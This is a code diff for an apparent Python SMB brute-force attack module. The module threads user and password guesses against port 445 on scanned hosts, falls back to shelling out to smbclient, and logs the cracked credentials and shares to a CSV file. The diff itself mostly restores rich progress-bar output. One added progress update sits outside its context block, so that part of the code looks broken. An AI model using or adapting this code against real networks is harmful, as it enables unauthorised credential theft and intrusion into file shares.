@@ -7,8 +7,8 @@ import threading
 import logging
 import time
 from subprocess import Popen, PIPE
-# from rich.console import Console
-# from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
+from rich.console import Console
+from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from smb.SMBConnection import SMBConnection
 from queue import Queue
 from shared import SharedData
@@ -41,7 +41,7 @@ class SMBBruteforce:
         Run the SMB brute force attack on the given IP and port.
         """
         return self.smb_connector.run_bruteforce(ip, port)
-
+    
     def execute(self, ip, port, row, status_key):
         """
         Execute the brute force attack and update status.
@@ -74,7 +74,7 @@ class SMBConnector:
                 f.write("MAC Address,IP Address,Hostname,Share,User,Password,Port\n")
         self.results = []  # List to store results temporarily
         self.queue = Queue()
-        # self.console = Console()
+        self.console = Console()
 
     def load_scan_file(self):
         """
@@ -118,7 +118,7 @@ class SMBConnector:
             process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
             stdout, stderr = process.communicate()
             if b"Sharename" in stdout:
-                logger.info(f"Successful authentication for {adresse_ip} with user '{user}' & password '{password}' using smbclient -L")
+                logger.info(f"Successful authentication for {adresse_ip} with user '{user}' & password '{password}' using smbclient -L") 
                 logger.info(stdout.decode())
                 shares = self.parse_shares(stdout.decode())
                 return shares
@@ -142,7 +142,7 @@ class SMBConnector:
                     shares.append(parts[0])
         return shares
 
-    def worker(self, success_flag):
+    def worker(self, progress, task_id, success_flag):
         """
         Worker thread to process items in the queue.
         """
@@ -163,7 +163,7 @@ class SMBConnector:
                     self.removeduplicates()
                     success_flag[0] = True
             self.queue.task_done()
-            # progress.update(task_id, advance=1)
+            progress.update(task_id, advance=1)
 
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
@@ -172,7 +172,7 @@ class SMBConnector:
         hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
 
         total_tasks = len(self.users) * len(self.passwords)
-
+        
         for user in self.users:
             for password in self.passwords:
                 if self.shared_data.orchestrator_should_exit:
@@ -182,33 +182,34 @@ class SMBConnector:
 
         success_flag = [False]
         threads = []
+        
+        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
+            task_id = progress.add_task("[cyan]Bruteforcing SMB...", total=total_tasks)
+            
+            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
+                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
+                t.start()
+                threads.append(t)
 
-        # with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
-        # task_id = progress.add_task("[cyan]Bruteforcing SMB...", total=total_tasks)
+            while not self.queue.empty():
+                if self.shared_data.orchestrator_should_exit:
+                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
+                    while not self.queue.empty():
+                        self.queue.get()
+                        self.queue.task_done()
+                    break
 
-        for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
-            t = threading.Thread(target=self.worker, args=(success_flag))
-            t.start()
-            threads.append(t)
+            self.queue.join()
 
-        while not self.queue.empty():
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                while not self.queue.empty():
-                    self.queue.get()
-                    self.queue.task_done()
-                break
-
-        self.queue.join()
-
-        for t in threads:
-            t.join()
+            for t in threads:
+                t.join()
 
         # If no success with direct SMB connection, try smbclient -L
         if not success_flag[0]:
             logger.info(f"No successful authentication with direct SMB connection. Trying smbclient -L for {adresse_ip}")
             for user in self.users:
                 for password in self.passwords:
+                    progress.update(task_id, advance=1)
                     shares = self.smbclient_l(adresse_ip, user, password)
                     if shares:
                         with self.lock:
@@ -245,15 +246,15 @@ if __name__ == "__main__":
     try:
         smb_bruteforce = SMBBruteforce(shared_data)
         logger.info("[bold green]Starting SMB brute force attack on port 445[/bold green]")
-
+        
         # Load the netkb file and get the IPs to scan
         ips_to_scan = shared_data.read_data()
-
+        
         # Execute the brute force on each IP
         for row in ips_to_scan:
             ip = row["IPs"]
             smb_bruteforce.execute(ip, b_port, row, b_status)
-
+        
         logger.info(f"Total number of successful attempts: {len(smb_bruteforce.smb_connector.results)}")
         exit(len(smb_bruteforce.smb_connector.results))
     except Exception as e:
